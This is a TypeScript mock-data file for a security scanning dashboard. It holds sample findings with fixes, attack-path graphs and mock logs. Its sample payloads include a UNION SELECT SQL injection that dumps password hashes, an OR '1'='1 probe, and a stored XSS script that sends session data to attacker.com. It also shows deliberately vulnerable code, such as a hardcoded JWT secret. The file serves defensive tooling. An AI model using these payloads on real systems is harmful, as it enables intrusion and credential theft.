import { Vulnerability, AttackNode, AttackPath, NotificationItem } from '../types/index.ts';

export const LOGO_URL = "https://lh3.googleusercontent.com/aida/AEtjO1XCcELEGqnxYU_orVKeawj1rxS-1qLfCPXzJhxp76OHBfWh5uR7oageIUSUug4DGEJxM1K51b3ds2LTrh693dK4FVnoYg_YSGH28LSXMQ05YFmLlRNCwEfVbRUO6x9e33Zm0SOg7RP62vbpxz7dfqywXETfNy3eR5rfI5aCiCKjxtymV5zCgMAmrTq9lJt6sdG9TdSW36B0eyIcYMRQ3hksA-hnNOd0jZX_NPiFO2BEzo-MM29lDJzJKHc";

export const AUDIENCE_EXPLANATIONS = {
  beginner: {
    title: "Beginner Explanation (Gemini 1.5 Pro)",
    quote: "“Imagine a locked diary where anyone who asks for a page can write their own rules on the front cover. The app reads whatever words are typed in the search box and accidentally treats them as master commands for the database.”",
    happening: "The search bar doesn't separate user search words from the database's internal command language.",
    matters: "Anyone on the public internet can trick the website into handing over passwords or secret customer lists.",
    impact: "Loss of customer trust, stolen user accounts, and severe website downtime.",
    component: "src/controllers/ProductSearchController.ts (Line 42:3)"
  },
  developer: {
    title: "Developer Explanation (Gemini 1.5 Pro)",
    quote: "“User-controlled input directly reaches a raw SQL string interpolation without parameterization or query binding. An attacker can break the query scope to extract, modify, or truncate arbitrary PostgreSQL database relations.”",
    happening: "The query argument req.query.q is concatenated via string addition directly into a database execution buffer without escaping.",
    matters: "Authentication logic is bypassed. Attackers can execute secondary UNION SELECT queries to dump user tables and admin passwords.",
    impact: "Catastrophic data breach involving PII and credentials, mandatory notification disclosures, and severe GDPR regulatory sanctions.",
    component: "src/controllers/ProductSearchController.ts (Line 42:3)"
  },
  secops: {
    title: "Security Analyst Explanation (Gemini 1.5 Pro)",
    quote: "“Classic CWE-89 injection vector confirmed through deterministic in-band PostgreSQL syntax error returns. Payload verification demonstrates UNION-based data extraction capability on unauthenticated perimeter API endpoint.”",
    happening: "Inadequate input sanitization allowing literal boundary termination with ' UNION SELECT sequences in HTTP GET query string.",
    matters: "Direct read primitive on pg_catalog, information_schema, and application authentication store without requiring privilege escalation.",
    impact: "CVSS v3.1 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Exploitation actively mapped to MITRE ATT&CK T1190.",
    component: "src/controllers/ProductSearchController.ts (Line 42:3)"
  },
  executive: {
    title: "Executive & Board Explanation (Gemini 1.5 Pro)",
    quote: "“Our automated defense detected a critical doorway left unlocked in our product search tool. While no unauthorized extraction has occurred in customer records, this vulnerability presents significant regulatory and legal liability if left unpatched.”",
    happening: "A software code defect in the online catalog search allows outside parties to bypass corporate security boundaries.",
    matters: "Must be addressed immediately to ensure zero disruption to compliance certification audits (SOC 2, ISO 27001).",
    impact: "Financial exposure estimated at $250k–$1.2M in regulatory fines if exploited prior to remediation.",
    component: "Product Catalog Search Module (PCI-DSS & SOC2 In-Scope)"
  }
};

export const VULNERABILITIES: Vulnerability[] = [
  {
    id: "vuln-1",
    name: "SQL Injection",
    cwe: "CWE-89",
    wasc: "WASC-19",
    category: "Database Vulnerability",
    severity: "critical",
    cvss: 9.8,
    priority: 1,
    endpoint: "/api/products/search",
    method: "GET",
    confidence: 99,
    status: "Open",
    detectedTime: "2m ago",
    scanner: "OWASP ZAP",
    scannerRuleId: "40018",
    parameter: "q",
    responseStatus: "500 Internal Server Error",
    latency: "114ms",
    payload: "/api/products/search?q=test' UNION SELECT null,username,password_hash FROM users--",
    payloadType: "Boolean Tautology / UNION Select",
    errorOutput: 'PostgreSQL ERROR: 42601: syntax error at or near "UNION" at character 54',
    summary: "An unescaped string injection was identified in the q query parameter of the search endpoint. By terminating the intended literal SQL syntax with a single quote, external unauthenticated callers can append arbitrary SQL operators, alter query execution trees, and access sensitive tabular datasets.",
    impact: "Full database extraction possible; sensitive user credential hashes at risk. Direct compliance breach (SOC2 & GDPR critical severity).",
    affectedFile: "src/controllers/ProductSearchController.ts",
    vulnerableCode: `// Line 41-43: Dangerous dynamic query concatenation\nconst query = "SELECT * FROM products WHERE name LIKE '%" + req.query.q + "%'";\nconst results = await db.query(query);`,
    remediatedCode: `// Line 41-43: Parameterized statement with bound positional arguments\nconst query = "SELECT id, name, sku, price FROM products WHERE name ILIKE $1";\nconst results = await db.query(query, ['%' + req.query.q + '%']);`,
    stepsToFix: [
      "Replace dynamic string concatenation immediately in the product query pipeline.",
      "Adopt parameterized queries utilizing native PostgreSQL positional placeholders ($1, $2) or ORM drivers.",
      "Enforce schema validation with Zod/Joi to disallow unescaped characters in raw search inputs.",
      "Run integration regression suite to confirm product search behavior remains unbroken.",
      "Scan all adjacent controller files for matching un-parameterized SQL statements."
    ],
    remediationTeam: "Backend Team"
  },
  {
    id: "vuln-2",
    name: "Broken Authentication (JWT)",
    cwe: "CWE-284",
    category: "Auth & Session Vectors",
    severity: "high",
    cvss: 8.5,
    priority: 2,
    endpoint: "/api/v1/auth/jwt-refresh",
    method: "POST",
    confidence: 94,
    status: "Open",
    detectedTime: "6m ago",
    scanner: "OWASP ZAP",
    scannerRuleId: "10045",
    parameter: "refreshToken",
    responseStatus: "200 OK (Weak Verify)",
    latency: "42ms",
    payload: "POST /api/v1/auth/jwt-refresh HTTP/1.1 (Payload: forged HMAC-SHA256 signature with secret 'secret123')",
    payloadType: "Weak Secret Dictionary Exploit",
    errorOutput: "Zero refresh-token revocation list implemented in Redis.",
    summary: "Weak HMAC-SHA256 signing secret subject to rapid dictionary offline crack. Enables forging arbitrary SecOps and Admin bearer tokens with no revocation check.",
    impact: "Enables arbitrary administrative token forgery and unauthenticated cluster privilege escalation.",
    affectedFile: "src/auth/jwtService.ts",
    vulnerableCode: `const secret = process.env.JWT_SECRET || 'secret123';\nconst token = jwt.sign(payload, secret, { algorithm: 'HS256' });`,
    remediatedCode: `const secret = await getVaultSecret('JWT_SIGNING_KEY_ED25519');\nconst token = jwt.sign(payload, secret, { algorithm: 'RS256', expiresIn: '15m' });`,
    stepsToFix: [
      "Rotate compromised symmetric secrets to asymmetric RS256/EdDSA private keys in HashiCorp Vault.",
      "Implement Redis token revocation blacklist keyed by JTI on logout and refresh.",
      "Enforce maximum refresh token lifespan of 7 days with rotational single-use enforcement."
    ],
    remediationTeam: "Security / Identity"
  },
  {
    id: "vuln-3",
    name: "Cross-Site Scripting (Stored)",
    cwe: "CWE-79",
    category: "Client Injection",
    severity: "high",
    cvss: 7.6,
    priority: 3,
    endpoint: "/dashboard/team/comments",
    method: "POST",
    confidence: 91,
    status: "Open",
    detectedTime: "12m ago",
    scanner: "Nuclei Engine",
    scannerRuleId: "CWE-79-DOM",
    parameter: "commentBody",
    responseStatus: "200 OK",
    latency: "38ms",
    payload: `<script>fetch('/api/auth/session').then(r=>r.json()).then(d=>new Image().src='http://attacker.com/steal?c='+encodeURIComponent(JSON.stringify(d)))</script>`,
    payloadType: "DOM Script Execution",
    errorOutput: "DOM parser executed unencoded <script> tag on SecOps review feed.",
    summary: "Unescaped markdown parser renders raw script elements directly in DOM within admin team comments. Session cookie lacks HttpOnly flag, permitting theft.",
    impact: "Admin session hijacking through script execution during triage workflows.",
    affectedFile: "src/components/CommentsThread.tsx",
    vulnerableCode: `<div dangerouslySetInnerHTML={{ __html: marked.parse(userComment) }} />`,
    remediatedCode: `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(marked.parse(userComment)) }} />`,
    stepsToFix: [
      "Incorporate DOMPurify sanitization step prior to any HTML rendering.",
      "Configure strict CSP directives: script-src 'self' without unsafe-inline.",
      "Add HttpOnly and Secure flags to all authentication session cookies."
    ],
    remediationTeam: "Frontend Core"
  },
  {
    id: "vuln-4",
    name: "Sensitive Data Exposure (Debug Dump)",
    cwe: "CWE-200",
    category: "Config & Headers",
    severity: "high",
    cvss: 7.1,
    priority: 4,
    endpoint: "/api/internal/metrics",
    method: "GET",
    confidence: 96,
    status: "In Review",
    detectedTime: "24m ago",
    scanner: "OWASP ZAP",
    scannerRuleId: "20019",
    parameter: "dump=true",
    responseStatus: "200 OK",
    latency: "18ms",
    payload: "GET /api/internal/metrics?dump=all&token=guest",
    payloadType: "Information Disclosure",
    errorOutput: "Response contains server environment variables and internal IP topology.",
    summary: "Internal metrics endpoint unauthenticated in staging build, leaking runtime environment variables, database hosts, and internal memory layouts.",
    impact: "Provides internal network blueprint and potential credentials to unauthorized external attackers.",
    affectedFile: "src/routes/internalMetrics.ts",
    vulnerableCode: `app.get('/api/internal/metrics', (req, res) => res.json({ env: process.env, stats }));`,
    remediatedCode: `app.get('/api/internal/metrics', authenticateAdminMtls, (req, res) => res.json(sanitizeMetrics(stats)));`,
    stepsToFix: [
      "Require Mutual TLS (mTLS) or VPC network isolation for all /internal/* endpoints.",
      "Scrub sensitive keys (DATABASE_URL, AWS_SECRET) from telemetry loggers.",
      "Restrict metrics endpoint access strictly to Prometheus cluster IPs."
    ],
    remediationTeam: "DevOps / Infrastructure"
  },
  {
    id: "vuln-5",
    name: "Missing Security Headers (CSP / HSTS)",
    cwe: "CWE-1021",
    category: "Config & Headers",
    severity: "medium",
    cvss: 5.4,
    priority: 5,
    endpoint: "/* (Global Edge Gateway)",
    method: "GET",
    confidence: 100,
    status: "Open",
    detectedTime: "30m ago",
    scanner: "OWASP ZAP",
    scannerRuleId: "10038",
    parameter: "N/A",
    responseStatus: "200 OK",
    latency: "8ms",
    payload: "GET / HTTP/1.1 (Response inspection for Content-Security-Policy & Strict-Transport-Security)",
    payloadType: "Passive Header Inspection",
    errorOutput: "Omission of Content-Security-Policy, X-Frame-Options, and HSTS headers.",
    summary: "Edge reverse proxy response lacks modern defensive browser security headers, exposing users to clickjacking and opportunistic SSL stripping.",
    impact: "Increased susceptibility to cross-site framing attacks and insecure downgrade attacks.",
    affectedFile: "src/server.ts",
    vulnerableCode: `// No helmet middleware configured on Express instance\napp.use(express.json());`,
    remediatedCode: `import helmet from 'helmet';\napp.use(helmet({\n  contentSecurityPolicy: { directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"] } },\n  hsts: { maxAge: 31536000, includeSubDomains: true }\n}));`,
    stepsToFix: [
      "Install helmet package and configure standard enterprise security headers.",
      "Deploy HSTS header with preload flag and 1-year maxAge.",
      "Define Content-Security-Policy with strict script-src and frame-ancestors 'none'."
    ],
    remediationTeam: "DevOps / Platform"
  },
  {
    id: "vuln-6",
    name: "Insecure Cookie Configuration",
    cwe: "CWE-1004",
    category: "Auth & Session Vectors",
    severity: "medium",
    cvss: 5.1,
    priority: 6,
    endpoint: "/api/auth/session",
    method: "POST",
    confidence: 100,
    status: "Remediated",
    detectedTime: "45m ago",
    scanner: "OWASP ZAP",
    scannerRuleId: "10054",
    parameter: "Set-Cookie",
    responseStatus: "200 OK",
    latency: "22ms",
    payload: "Set-Cookie: session_id=abc123xyz; Path=/;",
    payloadType: "Missing Cookie Directives",
    errorOutput: "Cookie lacks HttpOnly, Secure, and SameSite=Strict attributes.",
    summary: "Authentication cookie set without HttpOnly or SameSite flags, enabling client-side JavaScript access and potential CSRF state manipulation.",
    impact: "Permits session token extraction by malicious DOM scripts.",
    affectedFile: "src/auth/sessionHandler.ts",
    vulnerableCode: `res.cookie('session_id', token, { path: '/' });`,
    remediatedCode: `res.cookie('session_id', token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict',\n  path: '/',\n  maxAge: 3600000\n});`,
    stepsToFix: [
      "Configure httpOnly: true to prevent document.cookie access.",
      "Enable secure: true to enforce HTTPS-only transit.",
      "Set sameSite: 'strict' to eliminate cross-site request forgery vectors."
    ],
    remediationTeam: "Backend Team"
  }
];

export const ATTACK_NODES: Record<string, AttackNode> = {
  "actor": {
    id: "actor",
    title: "External Attacker",
    type: "actor",
    roleLabel: "Threat Actor",
    badge: "Untrusted",
    subtext: "Public Internet Perimeter • Anon IP: 198.51.100.42",
    description: "Unauthenticated adversary probing public edge endpoints via automated scanners."
  },
  "ingress": {
    id: "ingress",
    title: "Public API Gateway: /api/products/search",
    type: "ingress",
    roleLabel: "Ingress Gateway",
    badge: "Zero Auth Required",
    endpoint: "/api/products/search?q=",
    method: "GET",
    subtext: "Nginx Reverse Proxy • Rate Limit 25 RPS",
    description: "Public HTTP endpoint routing search queries directly to application controllers without perimeter WAF filtering."
  },
  "sqli": {
    id: "sqli",
    title: "SQL Injection Vulnerability",
    type: "vulnerability",
    roleLabel: "Target Vulnerability [Selected]",
    badge: "CRITICAL 9.8",
    severity: "critical",
    cvss: 9.8,
    cwe: "CWE-89",
    endpoint: "/api/products/search",
    method: "GET",
    subtext: "Validated by OWASP ZAP v2.14 • Confirmed PoC",
    description: "Unsanitized input string in search parameter executed against Postgres core engine.",
    scannerProof: "Payload: ' UNION SELECT null, username, password_hash FROM users--",
    whyContributes: "The unauthenticated search endpoint allows arbitrary SQL query execution, granting direct read access to underlying customer tables without requiring API tokens. This completely bypasses the perimeter firewall and eliminates the need for lateral credential harvesting.",
    mitreTechniques: [
      { code: "T1190", name: "Exploit Public-Facing App", tactic: "Initial Access" },
      { code: "T1059", name: "Command & Script Interpreter", tactic: "Execution" },
      { code: "T1530", name: "Data from Cloud Storage", tactic: "Exfiltration" }
    ],
    patchSnippet: {
      before: "- db.query(`SELECT * FROM p WHERE q = '${req.query.q}'`)",
      after: "+ db.query('SELECT * FROM p WHERE q = $1', [req.query.q])"
    }
  },
  "db-access": {
    id: "db-access",
    title: "PostgreSQL Database Access",
    type: "lateral",
    roleLabel: "Direct Storage Reach",
    badge: "HIGH IMPACT",
    severity: "high",
    subtext: "PostgreSQL 15.4 • Default app_user credentials",
    description: "Escapes web sandbox. Grants execution context as app_user role with elevated schema read privileges across tenant tables."
  },
  "exfiltration": {
    id: "exfiltration",
    title: "Sensitive Customer Data Exfiltration",
    type: "objective",
    roleLabel: "Kill Chain Objective Met",
    badge: "Breach Complete",
    severity: "critical",
    subtext: "142,000 hashed client credentials and billing addresses.",
    description: "Extraction of 142,000 customer records and billing credentials. Direct GDPR, HIPAA, and SOC2 violation."
  },
  "broken-access": {
    id: "broken-access",
    title: "Broken Access Control on /api/users",
    type: "lateral",
    roleLabel: "Secondary Path",
    badge: "CWE-284",
    severity: "high",
    cvss: 8.5,
    cwe: "CWE-284",
    endpoint: "/api/users",
    method: "GET",
    subtext: "Horizontal Privilege Escalation • Missing RBAC check",
    description: "IDOR susceptibility allowing unauthorized enumeration of user IDs and associated role claim payloads.",
    mitreTechniques: [
      { code: "T1078", name: "Valid Accounts", tactic: "Defense Evasion" },
      { code: "T1069", name: "Permission Groups Discovery", tactic: "Discovery" }
    ],
    whyContributes: "Allows an attacker to discover administrator accounts and forge JWT payload headers."
  },
  "session-hijack": {
    id: "session-hijack",
    title: "User Session Hijacking",
    type: "identity",
    roleLabel: "Identity Vector",
    badge: "HIGH RISK",
    severity: "high",
    subtext: "Predictable JWT secret • No token revocation list",
    description: "Predictable JWT generation pattern leaks valid session tokens during unauthorized reset invocations."
  },
  "admin-takeover": {
    id: "admin-takeover",
    title: "Admin Privilege Escalation",
    type: "objective",
    roleLabel: "Admin Takeover",
    badge: "System Hijack",
    severity: "critical",
    subtext: "Full cluster administrative scope acquired.",
    description: "Actor acquires full cluster administrative scope and changes security policies across tenant services."
  }
};

export const ATTACK_PATHS: AttackPath[] = [
  {
    id: "path-1",
    title: "Path #1: SQLi to Database Exfiltration",
    severity: "critical",
    cveNodesCount: 4,
    maxBlastRadius: "Database Leak (SOC2 / PII)",
    estimatedTtp: "< 4.2 minutes",
    complianceViolation: "SOC2, GDPR, HIPAA",
    timeline: [
      { phase: "PHASE 01", label: "T1595.002", title: "Recon & Discovery", description: "Automated crawling finds unprotected query parameters on API endpoint.", mitreCode: "T1595.002", severity: "medium" },
      { phase: "PHASE 02", label: "T1190", title: "Injection Weaponization", description: "Attacker crafts payload to trigger Postgres syntax handling error.", mitreCode: "T1190", severity: "high" },
      { phase: "PHASE 03", label: "T1059 / T1505", title: "Database Pivot", description: "App sandbox bypassed; SQL command execution against internal catalog.", mitreCode: "T1059 / T1505", active: true, severity: "critical" },
      { phase: "PHASE 04", label: "T1003", title: "Credential Dumping", description: "Systematic UNION queries extract schema definitions & user hashes.", mitreCode: "T1003", severity: "high" },
      { phase: "PHASE 05", label: "T1048 / T1530", title: "Full Data Exfiltration", description: "Target records piped outbound through disguised HTTP responses.", mitreCode: "T1048 / T1530", severity: "critical" }
    ],
    nodeIds: ["actor", "ingress", "sqli", "db-access", "exfiltration"]
  },
  {
    id: "path-2",
    title: "Path #2: Auth Bypass to Admin Takeover",
    severity: "high",
    cveNodesCount: 4,
    maxBlastRadius: "Cluster Takeover (All Services)",
    estimatedTtp: "< 9.5 minutes",
    complianceViolation: "ISO 27001, SOC2",
    timeline: [
      { phase: "PHASE 01", label: "T1046", title: "Endpoint Enumeration", description: "Actor scans internal API paths and identifies /api/users endpoint.", mitreCode: "T1046", severity: "medium" },
      { phase: "PHASE 02", label: "T1078", title: "BOLA/IDOR Exploitation", description: "Unchecked client ID headers reveal tenant admin account IDs.", mitreCode: "T1078", severity: "high" },
      { phase: "PHASE 03", label: "T1110", title: "Offline Secret Crack", description: "Weak HMAC secret cracked via dictionary attack in seconds.", mitreCode: "T1110", active: true, severity: "high" },
      { phase: "PHASE 04", label: "T1098", title: "Admin Token Forgery", description: "Forged superadmin JWT presented to cluster gatekeeper.", mitreCode: "T1098", severity: "critical" },
      { phase: "PHASE 05", label: "T1548", title: "Tenant Policy Takeover", description: "Cluster access control rules updated to establish persistence.", mitreCode: "T1548", severity: "critical" }
    ],
    nodeIds: ["actor", "ingress", "broken-access", "session-hijack", "admin-takeover"]
  }
];

export const NOTIFICATIONS: NotificationItem[] = [
  {
    id: "notif-1",
    title: "Critical SQL Injection in /api/products/search",
    message: "Automated scanner OWASP ZAP v2.14 confirmed database error leakage with CVSS 9.8.",
    severity: "critical",
    timestamp: "2 mins ago",
    read: false,
    linkAction: "dashboard"
  },
  {
    id: "notif-2",
    title: "New Attack Path Synthesized",
    message: "Gemini 1.5 Pro mapped active kill chain from public ingress to customer database breach.",
    severity: "high",
    timestamp: "8 mins ago",
    read: false,
    linkAction: "attack-paths"
  },
  {
    id: "notif-3",
    title: "Staging Rescan Verification Queued",
    message: "Patch PR #142 submitted for SQL Injection. Verification runner ZAP-04 ready.",
    severity: "medium",
    timestamp: "14 mins ago",
    read: false,
    linkAction: "verification"
  }
];

export const MOCK_TERMINAL_LOGS = [
  { method: "GET", path: "/api/v1/health", status: "200 OK", time: "14ms", type: "success" },
  { method: "GET", path: "/api/v1/auth/session", status: "401 Unauthorized", time: "22ms", type: "info" },
  { method: "POST", path: "/api/v1/users/login", status: "400 CSRF Missing", time: "35ms", type: "error" },
  { method: "GET", path: "/assets/main.bundle.js", status: "200 OK", time: "88ms", type: "success" },
  { method: "POST", path: "/api/products/search?q=test'OR'1'='1", status: "Spider Probe #1842", time: "114ms", type: "warning" },
  { method: "GET", path: "/api/v1/catalog/categories", status: "200 OK", time: "19ms", type: "success" },
  { method: "GET", path: "/api/users/1", status: "200 OK (BOLA Risk)", time: "42ms", type: "warning" },
  { method: "POST", path: "/api/v1/auth/jwt-refresh", status: "500 Server Err", time: "96ms", type: "error" }
];
